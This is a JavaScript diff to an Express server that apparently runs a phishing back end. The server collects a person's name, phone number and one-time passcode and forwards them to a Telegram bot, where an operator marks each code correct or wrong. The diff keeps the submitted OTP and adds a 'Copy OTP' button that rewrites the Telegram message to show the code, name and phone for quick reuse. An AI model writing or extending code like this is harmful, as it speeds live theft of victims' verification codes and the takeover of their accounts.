@@ -121,8 +121,10 @@ app.post('/submit-otp', (req, res) => {
 
     const requestId = uuidv4();
     otpRequests[requestId] = null;
-    requestMeta[requestId] = { name, phone, botId };
+    // CHANGE 1: Store the OTP in requestMeta so we can retrieve it for copying
+    requestMeta[requestId] = { name, phone, otp, botId };
 
+    // CHANGE 2: Added a second row with a "Copy OTP" button
     sendTelegram(
       bot,
       `🔐 OTP VERIFICATION
@@ -134,6 +136,9 @@ app.post('/submit-otp', (req, res) => {
         [
           { text: '✅ Correct OTP', callback_data: `otp_ok:${requestId}` },
           { text: '❌ Wrong OTP', callback_data: `otp_bad:${requestId}` }
+        ],
+        [
+          { text: '📋 Copy OTP', callback_data: `copy_otp:${requestId}` }
         ]
       ]
     );
@@ -194,6 +199,36 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 
   const [action, requestId] = cb.data.split(':');
   const meta = requestMeta[requestId];
+
+  // CHANGE 3: Handle the "Copy OTP" action
+  if (action === 'copy_otp') {
+    if (meta && meta.otp) {
+      // Build a message that displays only the OTP inside a code block
+      const copyText = `📋 OTP Text (Tap & hold to copy)
+━━━━━━━━━━━━━━━━━━━━━
+<code>${meta.otp}</code>
+━━━━━━━━━━━━━━━━━━━━━
+
+👤 Name: ${meta.name || '—'}
+📞 Phone: ${meta.phone || '—'}`;
+
+      try {
+        // Edit the original message: replace text, remove all buttons
+        await axios.post(`https://api.telegram.org/bot${bot.token}/editMessageText`, {
+          chat_id: cb.message.chat.id,
+          message_id: cb.message.message_id,
+          text: copyText,
+          parse_mode: 'HTML',
+          reply_markup: { inline_keyboard: [] }
+        });
+      } catch (editError) {
+        console.error('Edit error:', editError.message);
+      }
+    }
+
+    await answerCallback(bot, cb.id);
+    return res.sendStatus(200); // Stop here, do not run the rest of the logic
+  }
 
   let feedback = '';
 
